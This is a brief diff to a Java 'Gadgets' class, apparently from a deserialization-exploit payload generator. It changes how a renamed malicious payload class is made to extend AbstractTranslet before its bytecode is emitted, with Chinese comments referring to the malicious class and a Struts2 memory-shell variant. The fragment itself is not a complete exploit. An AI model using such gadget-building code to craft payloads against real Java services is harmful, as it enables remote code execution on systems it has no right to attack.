@@ -259,15 +259,17 @@ public class Gadgets {
 
 			ctClass.setName(newClassName);
 
-			// 如果指定继承 AbstractTranslet，统一由 ClassLoaderTemplate 加载
-			// 不搞那么麻烦写 if else 了，有长度需求自己再改吧
 			if (IS_INHERIT_ABSTRACT_TRANSLET) {
 				shrinkBytes(ctClass);
 
-				// 如果恶意类自身没有父类，可以简简单单通过 setSuperclass，能降低很大的长度
-//				ctClass.setSuperclass(superClass);
-				bytes = ctClass.toBytecode();
-				cName = ctClass.getName();
+				// 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
+				if (myClass.getSuperclass() != Object.class) {
+					bytes = ctClass.toBytecode();
+					cName = ctClass.getName();
+				} else {
+					// 否则直接设置父类
+					ctClass.setSuperclass(superClass);
+				}
 			}
 
 			// Struts2ActionMS 额外处理
